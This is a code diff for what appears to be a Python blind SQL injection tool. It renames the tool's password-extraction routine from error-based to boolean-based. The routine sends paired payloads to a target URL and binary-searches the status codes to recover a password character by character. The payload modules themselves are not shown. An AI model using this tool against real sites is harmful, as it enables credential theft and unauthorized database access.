@@ -1,13 +1,13 @@
-from src.payload_and_stuff import sending_payload_for_error_based_SQLi
+from src.payload_and_stuff import sending_payload_for_boolean_based_SQLi
 import sys
 from colorama import Fore, Style
 from src.info_message import output_message, warning_message, successful_message
-from src.binary_search import  binary_search_for_error_sqli
+from src.binary_search import  binary_search_for_boolean_sqli
 from src.info_message import welcome_message
 
 
 
-def get_password_with_error_based_SQLi():
+def get_password_with_boolean_based_SQLi():
 
     welcome_message()
         
@@ -32,7 +32,7 @@ def get_password_with_error_based_SQLi():
         output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
         output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
         output_message(f"[++] Index number : {indice}")
-        status_code, status_code2= sending_payload_for_error_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
+        status_code, status_code2= sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
        
         print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")
 
@@ -41,7 +41,7 @@ def get_password_with_error_based_SQLi():
         
         while low_bound <= high_bound:
             try:
-                high_bound,low_bound,mid_point = binary_search_for_error_sqli(status_code, operator1, high_bound, low_bound, mid_point)
+                high_bound,low_bound,mid_point = binary_search_for_boolean_sqli(status_code, operator1, high_bound, low_bound, mid_point)
                 
                 """The result_control will say if the payload parameter is correct, if it's the case, we change the index"""
                 
@@ -74,7 +74,7 @@ def get_password_with_error_based_SQLi():
             output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
             output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
             output_message(f"[++] Index number : {indice}")
-            status_code, status_code2 = sending_payload_for_error_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
+            status_code, status_code2 = sending_payload_for_boolean_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
             print(f"Status_code: {status_code}, Status_code2: {status_code2}\n")
 
             
@@ -113,4 +113,4 @@ def get_password_with_error_based_SQLi():
         
         
 if __name__=='__main__':
-    get_password_with_error_based_SQLi()
+    get_password_with_boolean_based_SQLi()
